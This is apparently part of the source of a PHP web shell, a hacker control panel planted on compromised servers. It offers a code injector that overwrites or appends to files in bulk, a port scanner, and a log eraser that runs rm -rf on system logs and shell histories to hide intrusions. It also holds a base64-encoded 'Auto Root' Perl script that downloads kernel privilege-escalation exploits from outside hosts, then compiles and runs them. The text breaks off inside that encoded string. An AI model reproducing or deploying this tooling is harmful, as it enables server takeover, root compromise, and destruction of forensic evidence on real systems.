if(extension_loaded("curl")){ echo "cURL: <font color=\"Green\"><b>ON</b></font><br>"; }else{ echo "cURL: <font color=\"Red\"><b>OFF</b></font><br>"; }
if(function_exists("gzencode")){ echo "GZip: <b><font color=\"Green\">ON</font></b><br>"; }else{ echo "GZip: <b><font color=\"Red\">OFF</font></b><br>"; }
if(function_exists("mail")){ echo "Mail: <font color=\"Green\"><b>ON</b></font><br>"; }else{ echo "Mail: <font color=\"Red\"><b>OFF</b></font><br>"; }
if(ini_get("magic_quotes_gpc")){ echo "Magic_quotes_gpc: <font color=\"Green\"><b>ON</b></font><br>"; }else{ echo "Magic_quotes_gpc: <font color=\"Red\"><b>OFF</b></font><br>"; }
if(ini_get("open_basedir") == "on"){ echo "Open_basedir: <font color=\"Green\"><b>ON</b></font><br>"; }else{ echo "Open_basedir: <font color=\"Red\"><b>OFF</b></font><br>"; }
if(ini_get('ini_restore') == "on"){ echo "Ini_restore: <font color=\"Green\"><b>ON</b></font><br>"; }else{ echo "Ini_restore: <font color=\"Red\"><b>OFF</b></font><br>"; }
echo "Zend Version: <font color=\"White\"><b>".@zend_version()."</b></font><br>";
echo "PHP Version: <b><font color=\"White\">".phpversion()."</b></font><br> ";
echo "Software: <b><font color=\"White\">".$software."</font></b><br>";
echo "Local Time: <b><font color=\"White\">".date('H:i Y/m/d')."</font></b><br>";
echo "Current Dir: <b><a href=\"?id=14&vf=".realpath(".").$sep."\" >".realpath(".").$sep."</a></b><br>";


}

if($_GET["outros"] == 2){ /* Code Injector  */
if(!empty($_POST["modoE"])){ $valor = $_POST["modoE"]; }else{ $valor = "Nenhum"; }
echo "<font size=\"5\"><center>- Code injector -</center></font><hr size=\"full\"><br>
<form action=\"\" method=\"POST\" >
<font size=\"3\">Dir: </font> <input size=\"100\" type=\"text\" name=\"dir\" value=\"";
if($_POST["dir"]){ echo $_POST["dir"]; }else{ echo realpath(".").$sep; }
echo "\"><br>
<font size=\"3\">File type: </font><input type=\"text\" name=\"type\" value=\".txt\"><br>
<font size=\"3\">Option: </font><select name=\"modoE\">
<option value=\"".$valor."\">".$valor."</option>
<option value=\"Adicionar\">Add Code</option>
<option value=\"Sobre-escrever\">Overwrite</option>
</select><br>
<font size=\"3\">Codigo para injetar: </font>
<textarea name=\"code\">";

if (!empty($_POST["modoE"])){
if($_POST["modoE"]=="Adicionar"){ $type_e = "a"; }elseif($_POST["modoE"]=="Sobre-escrever"){ $type_e = "w"; }else{ $type_e = "a"; } 
echo "Dir: ".$_POST["dir"]."\n
File Type: ".$_POST["type"]."\n\n";
$path = $_SERVER["DOCUMENT_ROOT"];
$diretorio = dir(addbarra($_POST["dir"])); 
while($arquivo=$diretorio->read()){ 
$arq = $path."/".$arquivo;
if (strpos($arq, $_POST["type"])==TRUE){
$file = fopen($arquivo, $type_e);
if(!file){ echo " Error in inject in: ".$arquivo."\n"; }
fwrite($file,$_POST["code"]);
fclose($file);
echo "Code injected into: ".$arquivo."\n";
}
} 
$diretorio->close();
}
echo "</textarea><input type=\"submit\" value=\"Executar\"><br></form>";
}

if($_GET["outros"] == 3){ /* Port Scanner   */
echo "<font size=\"5\"><center> - Port Scanner - </center></font><hr size=\"full\"><br>
<form action=\"\" method=\"POST\">
Host/IP: <input type=\"ext\" name=\"host\" value=\"". $_POST["host"]."\">
Begin in: <input type=\"text\" name=\"inicio\" value=\"". $_POST["inicio"]."\">
End in: <input type=\"text\" name=\"fim\" value=\"". $_POST["fim"]."\">
<input type=\"submit\" name=\"scan\" value=\"Scan\"><br>
</form>
";
if (isset($_POST["scan"])){
echo "<hr size=\"full\">
<textarea>";
$ip     = $_POST["host"];
$inicio = $_POST["inicio"];
$fim    = $_POST["fim"];
if ($ip=="" or $inicio=="" or $fim==""){ echo "Error!"; exit(); }
//date("d/m/y")."~".date("H:i")
echo " Target: ".$ip."\n Started in: ".date('H:i Y/m/d')."\n\n";
while($inicio < $fim){
$inicio++;
$porta = $inicio;
$fp = fsockopen($ip,$porta,$errno,$errstr,10);
if($fp == TRUE){ echo "\nOpen: $porta"; }else{ echo "\nclosed: $porta"; }
}
fclose($fp);
}
echo "</textarea>";
}

if($_GET["outros"] == 4){ /* Encript String */
echo "<font size=\"5\"><center>- Encript Strings -</center></font><hr size=\"full\"><br>
<form action=\"\" method=\"POST\">
<font size=\"4\" >String: </font><input size=\"40\" type=\"text\" name=\"string\" value=\"".$_POST["string"]."\">
<input type=\"submit\" value=\"Encript\">
</form>";

$string = $_POST["string"];
$tamanho = strlen($string);
if ($tamanho > 0){
echo "<textarea>";
echo "String      : ".$string."
Length      : ".strlen($string)."
------------- [ \+.-/ ] -------------
MD5         : ".md5($string)."
Base64      : ".base64_encode($string)."
SHA1        : ".sha1($string)."
MD4         : ".hash("md4",$string)."
SHA256 	    : ".hash("sha256",$string);
echo "</textarea>";
}else{
echo "<hr size=\"full\">This tool encript in MD5, Base64, SHA1, MD4 and SHA256";
}
}

if($_GET["outros"] == 5){ /* Log Eraser     */
echo "<font size=\"5\"><center>- Log Eraser -</center></font><hr size=full><br>";
$lista = array("rm -rf /tmp/logs", "rm -rf /root/.ksh_history", "rm -rf /root/.bash_history", "rm -rf /root/.bash_logout", "rm -rf /usr/local/apache/logs", "rm -rf /usr/local/apache/log", "rm -rf /var/apache/logs", "rm -rf /var/apache/log", "rm -rf /var/run/utmp", "rm -rf /var/logs", "rm -rf /var/log", "rm -rf /var/adm", "rm -rf /etc/wtmp", "rm -rf /etc/utmp", "rm -rf /var/log/lastlog", "rm -rf /var/log/wtmp");
echo "<textarea>";
foreach($lista as $comando){
if(executar($comando) == TRUE){
$mostrar = str_replace("rm -rf ","",$comando);
echo "Successfully deleted : ".$mostrar."\n";
}else{
$mostrar = str_replace("rm -rf ","",$comando);
echo "Error : ".$mostrar."\n";
}
}
echo "</textarea>";
}

if($_GET["outros"] == 6){ /* Auto Rooter    */
echo "<font size=\"5\"><center>- Auto Root -</center></font><hr size=\"full\">
<center>Auto Root written by <b>HusseiN98D</b>, found in <b>AnonGhost Shell v2 2014</b>( <b>Mauritania Attacker</b> )</center>
<hr width=\"50%\">
<textarea>";
$exploit = "cHJpbnQgIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4iOw0KcHJpbnQgIiAgICAgICAgIEFub25HaG9zdCBTbTRzaCBhdXRvIHIwMHQgICAgICAgICAgXG4iOw0KcHJpbnQgIiAgICAgICAgICAgICAgICAgMjAwNSAtIDIwMTMgICAgICAgICAgICAgICAgXG4iOw0KcHJpbnQgIiAgICAgX19fX19fXyAgX19fX19fXyAgX19fX19fXyBfX19fX19fX18gICAgXG4iOw0KcHJpbnQgIiAgICAoICBfX19fICkoICBfXyAgICkoICBfXyAgIClcX18gICBfXy8gICAgXG4iOw0KcHJpbnQgIiAgICB8ICggICAgKXx8ICggICkgIHx8ICggICkgIHwgICApICggICAgICAgXG4iOw0KcHJpbnQgIiAgICB8IChfX19fKXx8IHwgLyAgIHx8IHwgLyAgIHwgICB8IHwgICAgICAgXG4iOw0KcHJpbnQgIiAgICB8ICAgICBfXyl8ICgvIC8pIHx8ICgvIC8pIHwgICB8IHwgICAgICAgXG4iOw0KcHJpbnQgIiAgICB8IChcICggICB8ICAgLyB8IHx8ICAgLyB8IHwgICB8IHwgICAgICAgXG4iOw0KcHJpbnQgIiAgICB8ICkgXCBcX198ICAoX18pIHx8ICAoX18pIHwgICB8IHwgICAgICAgXG4iOw0KcHJpbnQgIiAgICB8LyAgIFxfXy8oX19fX19fXykoX19fX19fXykgICApXyggICAgICAgXG4iOw0KcHJpbnQgIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXG4iOw0KcHJpbnQgIgkJCSAgIENvZGVkIGJ5IEh1c3NlaU45OEQgICAgICAgICAgICAgXG4iOw0KcHJpbnQgIgkJCQkgICAgIDE5LzA4LzIwMTQJCSAgICAgICAgICAgXG4iOw0KcHJpbnQgIgkJICBUbyByb290IGxpbnV4ICwgcGVybCAkMCBsbnggICAgICAgICAgXG4iOw0KcHJpbnQgIgkJICBUbyByb290IEJzZCAsICBwZXJsICQwIGJzZCAgICAgICAgICAgXG4iOw0KcHJpbnQgIgkJICBUbyByb290IFN1bk9TICwgcGVybCAkMCBzdW5vcyAgICAgICAgXG4iOw0KcHJpbnQgIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4iOw0KDQoNCmlmICgkQVJHVlswXSA9fiAibG54IiApDQp7DQpwcmludCAiIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuIjsNCnByaW50ICIjIExpbnV4L0JzZC9TdW5vcyBBVVRPLVJPT1RFUiAgI1xuIjsNCnByaW50ICIjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI1xuIjsNCnByaW50ICIjICAgICAgICBIYXZlIGEgY29mZmUgICAgICAgICAgI1xuIjsNCnByaW50ICIjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI1xuIjsNCnByaW50ICIjICAgICAgIFJvb3RpbmcgbGludXggICAgICAgICAgI1xuIjsNCnByaW50ICIjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4iOw0Kc3lzdGVtKCJ1bmFtZSAtYTtta2RpciBsbng7Y2QgbG54Iik7DQpwcmludCAiWytdIFdhaXQuLlxuIjsNCg0Kc3lzdGVtKCJ3Z2V0IHd3dy50dXgtcGxhbmV0LmZyL3B1YmxpYy9oYWNrL2V4cGxvaXRzL2tlcm5lbC9sb2NhbC1yb290LWV4cGxvaXQtZ2F5cm9zLmMiKTsNCnN5c3RlbSgiZ2NjIC1vIGdheXJvcyBsb2NhbC1yb290LWV4cGxvaXQtZ2F5cm9zLmMiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGdheXJvcyIpOw0Kc3lzdGVtKCIuL2dheXJvcyIpOw0Kc3lzdGVtKCJpZCIpOw0KDQpzeXN0ZW0oIndnZXQgd3d3LnR1eC1wbGFuZXQuZnIvcHVibGljL2hhY2svZXhwbG9pdHMva2VybmVsL3Ztc3BsaWNlLWxvY2FsLXJvb3QtZXhwbG9pdC5jIik7DQpzeXN0ZW0oImdjYyAtbyB2bXNwbGljZS1sb2NhbC1yb290LWV4cGxvaXQgdm1zcGxpY2UtbG9jYWwtcm9vdC1leHBsb2l0LmMiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHZtc3BsaWNlLWxvY2FsLXJvb3QtZXhwbG9pdCIpOw0Kc3lzdGVtKCIuL3Ztc3BsaWNlLWxvY2FsLXJvb3QtZXhwbG9pdCIpOw0Kc3lzdGVtKCJpZCIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL3JtY2N1cmR5LmNvbS9zY3JpcHRzL2Rvd25sb2FkZWQvbG9jYWxyb290LzIuNi54L3gyIik7DQpzeXN0ZW0oImNobW9kIDc3NyB4MiIpOw0Kc3lzdGVtKCIuL3gyIik7DQpzeXN0ZW0oImlkIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vcm1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvMi42LngveCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgeCIpOw0Kc3lzdGVtKCIuL3giKTsNCnN5c3RlbSgid2dldCBodHRwOi8vcm1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvMi42LngvdXNlbGliMjQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHVzZWxpYjI0Iik7DQpzeXN0ZW0oIi4vdXNlbGliMjQiKTsNCnN5c3RlbSgiaWQiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9ybWNjdXJkeS5jb20vc2NyaXB0cy9kb3dubG9hZGVkL2xvY2Fscm9vdC8yLjYueC9yb290MiIpOw0Kc3lzdGVtKCJjaG1vZCA3Nzcgcm9vdDIiKTsNCnN5c3RlbSgiaWQiKTsNCg0Kc3lzdGVtKCIuL3Jvb3QyIik7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3JtY2N1cmR5LmNvbS9zY3JpcHRzL2Rvd25sb2FkZWQvbG9jYWxyb290LzIuNi54L2ttb2QyIik7DQpzeXN0ZW0oImNobW9kIDc3NyBrbW9kMiIpOw0Kc3lzdGVtKCIuL2ttb2QyIik7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3JtY2N1cmR5LmNvbS9zY3JpcHRzL2Rvd25sb2FkZWQvbG9jYWxyb290LzIuNi54L2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgaDAwbHlzaGl0Iik7DQpzeXN0ZW0oIi4vaDAwbHlzaGl0Iik7DQpzeXN0ZW0oImlkIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vcm1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvMi42LngvZXhwLnNoIik7DQpzeXN0ZW0oImNobW9kIDc1NSBleHAuc2giKTsNCnN5c3RlbSgic2ggZXhwLnNoIik7DQpzeXN0ZW0oImlkIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vcm1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvMi42LngvZWxmbGJsIik7DQpzeXN0ZW0oImNobW9kIDc3NyBlbGZsYmwiKTsNCnN5c3RlbSgiLi9lbGZsYmwiKTsNCnN5c3RlbSgiaWQiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9ybWNjdXJkeS5jb20vc2NyaXB0cy9kb3dubG9hZGVkL2xvY2Fscm9vdC8yLjYueC9jdzcuMyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgY3c3LjMiKTsNCnN5c3RlbSgiLi9jdzcuMyIpOw0Kc3lzdGVtKCJpZCIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMTgtMzc0LjEyLjEuZWw1LTIwMTIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0zNzQuMTIuMS5lbDUtMjAxMiIpOw0Kc3lzdGVtKCIuLzIuNi4xOC0zNzQuMTIuMS5lbDUtMjAxMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4xOC0yNzQtMjAxMSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjE4LTI3NC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjE4LTI3NC0yMDExIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMTgtNi14ODYtMjAxMSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjE4LTYteDg2LTIwMTEiKTsNCnN5c3RlbSgiLi8yLjYuMTgtNi14ODYtMjAxMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3Qvdm1zcGxpY2UtbG9jYWwtcm9vdC1leHBsb2l0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyB2bXNwbGljZS1sb2NhbC1yb290LWV4cGxvaXQiKTsNCnN5c3RlbSgiLi92bXNwbGljZS1sb2NhbC1yb290LWV4cGxvaXQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIwMTEgTG9jYWxSb290IEZvciAyLjYuMTgtMTI4LmVsNSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAxMSBMb2NhbFJvb3QgRm9yIDIuNi4xOC0xMjguZWw1Iik7DQpzeXN0ZW0oIi4vMjAxMSBMb2NhbFJvb3QgRm9yIDIuNi4xOC0xMjguZWw1Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMzMiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4zMyIpOw0Kc3lzdGVtKCIuLzIuNi4zMyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjMzLTIwMTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4zNC0yMDExIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzQtMjAxMSIpOw0Kc3lzdGVtKCIuLzIuNi4zNC0yMDExIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMzQtMjAxMUV4cGxvaXQxIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzQtMjAxMUV4cGxvaXQxIik7DQpzeXN0ZW0oIi4vMi42LjM0LTIwMTFFeHBsb2l0MSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjM0LTIwMTFFeHBsb2l0MiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjM0LTIwMTFFeHBsb2l0MiIpOw0Kc3lzdGVtKCIuLzIuNi4zNC0yMDExRXhwbG9pdDIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4zNyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjM3Iik7DQpzeXN0ZW0oIi4vMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4zNy1yYzIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4zNy1yYzIiKTsNCnN5c3RlbSgiLi8yLjYuMzctcmMyIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC96MWQtMjAxMSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgejFkLTIwMTEiKTsNCnN5c3RlbSgiLi8yLjYuMTgtMjAxMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMS0yIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxLTIiKTsNCnN5c3RlbSgiLi8xLTIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzEtMyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMS0zIik7DQpzeXN0ZW0oIi4vMS0zIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8xLTQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDEtNCIpOw0Kc3lzdGVtKCIuLzEtNCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMTAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDEwIik7DQpzeXN0ZW0oIi4vMTAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzExIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxMSIpOw0Kc3lzdGVtKCIuLzExIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8xMiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMTIiKTsNCnN5c3RlbSgiLi8xMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMTQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDE0Iik7DQpzeXN0ZW0oIi4vMTQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE1LnNoIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxNS5zaCIpOw0Kc3lzdGVtKCIuLzE1LnNoIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8xNTE1MCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMTUxNTAiKTsNCnN5c3RlbSgiLi8xNTE1MCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMTUyMDAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDE1MjAwIik7DQpzeXN0ZW0oIi4vMTUyMDAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE2Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAxNiIpOw0Kc3lzdGVtKCIuLzE2Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8xNi0xIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxNi0xIik7DQpzeXN0ZW0oIi4vMTYtMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMTgiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDE4Iik7DQpzeXN0ZW0oIi4vMTgiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE4LTUiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDE4LTUiKTsNCnN5c3RlbSgiLi8xOC01Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyIik7DQpzeXN0ZW0oIi4vMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi0xIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLTEiKTsNCnN5c3RlbSgiLi8yLTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzItNi05LTIwMDUiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDItNi05LTIwMDUiKTsNCnN5c3RlbSgiLi8yLTYtOS0yMDA1Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLTYtOS0yMDA2Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLTYtOS0yMDA2Iik7DQpzeXN0ZW0oIi4vMi02LTktMjAwNiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi40LjIxLTIwMDYiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDItNi05LTIwMDYiKTsNCnN5c3RlbSgiLi8yLTYtOS0yMDA2Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjQuMzYuOTIuNi4yNy41IC0gMjAwOCBMb2NhbCByb290Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjQuMzYuOTIuNi4yNy41IC0gMjAwOCBMb2NhbCByb290Iik7DQpzeXN0ZW0oIi4vMi40LjM2LjkyLjYuMjcuNSAtIDIwMDggTG9jYWwgcm9vdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTE2NC0yMDEwIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMTgtMTY0LTIwMTAiKTsNCnN5c3RlbSgiLi8yLjYuMTgtMTY0LTIwMTAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4xOC0xOTQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0xOTQiKTsNCnN5c3RlbSgiLi8yLjYuMTgtMTk0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMTgtMTk0LjEtMjAxMCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjE4LTE5NC4xLTIwMTAiKTsNCnN5c3RlbSgiLi8yLjYuMTgtMTk0LjEtMjAxMCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTE5NC4yLTIwMTAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0xOTQuMi0yMDEwIik7DQpzeXN0ZW0oIi4vMi42LjE4LTE5NC4yLTIwMTAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4yLWhvb2x5c2hpdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjItaG9vbHlzaGl0Iik7DQpzeXN0ZW0oIi4vMi42LjItaG9vbHlzaGl0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMjAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yMCIpOw0Kc3lzdGVtKCIuLzIuNi4yMCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIwLTIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yMC0yIik7DQpzeXN0ZW0oIi4vMi42LjIwLTIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCg0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMjItMjAwOCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjIyLTIwMDgiKTsNCnN5c3RlbSgiLi8yLjYuMjItMjAwOCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIyLTYtODZfNjQtMjAwNyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjIyLTYtODZfNjQtMjAwNyI